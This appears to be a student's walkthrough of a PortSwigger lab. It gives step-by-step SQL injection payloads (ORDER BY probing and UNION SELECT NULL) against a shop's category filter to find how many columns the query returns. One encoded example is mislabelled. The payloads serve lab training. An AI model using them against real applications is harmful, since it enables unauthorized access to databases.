# SQL injection UNION attack, determining the number of columns returned by the query

## This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

## To solve the lab, determine the number of columns returned by the query by performing a [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that returns an additional row containing null values.

___

step 1

send `/filter?category=Lifestyle` to repeater
send request you will get 4 different item

![screnshot](lab3_lifstyle_repeater.jpg)



**Note**: to determine SQL injection UNION attack injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs

URL encoded (Ctrl+u) => select the sentences to make them highlighted press (Ctrl+u) 
>' ORDER BY 1--  => URL encoded  ('+ORDER+BY+1)
>' ORDER BY 2-- => URL encoded ('+ORDER+BY+2)
>' ORDER BY 3-- => URL encoded ('+ORDER+BY+2)
> etc.

``
step 2

add `'+ORDER+BY+1--` at the end
`/filter?category=Lifestyle'+ORDER+BY+1--`

![screnshot](lab3_order_by_1.jpg)

step 3

`'+ORDER+BY+2--`
`/filter?category=Lifestyle'+ORDER+BY+2--`

![screnshot](lab3_order_by_2.jpg)

step 4

`'+ORDER+BY+3-- `
`/filter?category=Lifestyle'+ORDER+BY+3--`

![screnshot](lab3_order_by_3.jpg)

step 5

`'+ORDER+BY+4--`
`/filter?category=Lifestyle'+ORDER+BY+4--`
The ORDER BY position number 4 is out of range of the number of items in the select list. so you get internal error

![screnshot](lab3_order_by_4.jpg)



to solve the lab
*determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing `null` values*.

>' UNION SELECT NULL--  => ('+UNION+SELECT+NULL--)
>' UNION SELECT NULL,NULL-- =>('+UNION+SELECT+NULL,NULL--)
>' UNION SELECT NULL,NULL,NULL-- =>('+UNION+SELECT+NULL,NULL,NULL--)
>etc.

**Note: If the number of nulls does not match the number of columns, the database returns an error**

step 6

add `'+UNION+SELECT+NULL--` at the end
`/filter?category=Lifestyle'+UNION+SELECT+NULL--`

![screnshot](lab3_lifestyle_repeater_null.jpg)

step 7

`/filter?category=Lifestyle'+UNION+SELECT+NULL,NULL--`

![screnshot](lab3_lifestyle_repeater_null_null.jpg)

step 8

`/filter?category=Lifestyle'+UNION+SELECT+NULL,NULL,NULL--`

![screnshot](lab3_lifestyle_repeater_null_null_null.jpg)


![screnshot](portswigger_wsa/P01_server_side_topic/P01_sql_injection/images/lab3_solved_lab.jpg)